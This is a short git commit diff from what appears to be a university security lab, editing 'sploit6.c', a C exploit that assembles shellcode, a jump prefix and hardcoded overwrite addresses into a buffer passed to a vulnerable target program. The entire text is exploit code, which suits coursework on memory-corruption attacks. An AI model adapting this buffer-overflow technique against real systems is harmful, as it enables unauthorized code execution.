7a0ea9f1b2dc355a64a68af01262a7cd6aeffd0a
zandent <simon.zhao@mail.utoronto.ca>
2021-02-05 15:15:36 -0500

    update 6

--- lab1/sploits/sploit6.c
+++ lab1/sploits/sploit6.c
@@ -16,8 +16,8 @@ int main(void)
   char part1[] = "\xeb\x25\x90\x90\x91\x90\x90\x90";
   memcpy(buf,part1,strlen(part1));
   memcpy(buf+strlen(part1),shellcode+2,strlen(shellcode)-2);
-  memcpy(buf+strlen(shellcode)+ 6 + 4 - (strlen(shellcode)+6)%4 + 4, "\x69\xfe\x21\x20", 4);
-  memcpy(buf+72, "\x28\xee\x04\x01\x5c\xee\x04\x01", 8);
+  //memcpy(buf+strlen(shellcode)+ 6 + 4 - (strlen(shellcode)+6)%4 + 4, "\x69\xfe\x21\x20", 4);
+  memcpy(buf+72, "\x28\xee\x04\x01\x68\xfe\x21\x20", 8);
   args[0] = TARGET; args[1] = buf; args[2] = NULL;
   env[0] = NULL;
 
